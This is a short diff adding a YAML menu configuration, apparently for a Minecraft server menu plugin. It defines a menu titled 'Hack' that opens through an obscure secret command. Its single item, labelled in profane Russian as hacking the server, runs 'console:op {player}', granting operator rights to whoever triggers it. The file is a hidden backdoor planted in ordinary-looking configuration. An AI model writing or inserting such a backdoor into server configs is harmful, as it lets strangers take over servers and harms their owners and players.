@@ -1,0 +1,13 @@
+menu-settings:
+  name: 'Взломать'
+  rows: 3
+  command: 'itsfuntopyoutuber2281337'
+1:
+  COMMAND: 'console:op {player}'
+  NAME: '&aВзламать сервер нахуй'
+  LORE:
+    - 'Хуяк'
+  ID: '137'
+  KEEP-OPEN: true
+  POSITION-X: 5
+  POSITION-Y: 2
